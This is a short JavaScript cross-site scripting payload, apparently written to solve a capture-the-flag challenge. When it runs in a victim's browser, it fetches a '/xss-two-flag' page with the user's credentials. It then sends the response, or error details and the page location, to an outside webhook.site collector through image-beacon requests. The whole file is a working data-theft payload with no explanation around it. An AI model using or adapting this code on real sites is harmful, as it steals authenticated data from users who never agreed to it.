(async () => {
  const hook = 'https://webhook.site/a258ded4-e428-4f12-8023-ea9e69072dde';
  const send = (key, value) => {
    new Image().src = hook + '?' + key + '=' + encodeURIComponent(value);
  };

  try {
    const res = await fetch('/xss-two-flag', {
      credentials: 'include',
      mode: 'same-origin'
    });

    const text = await res.text();

    send('status', String(res.status));
    send('flag', text);
  } catch (e) {
    send('err', String(e));
    send('href', location.href);
    send('origin', location.origin);
  }
})();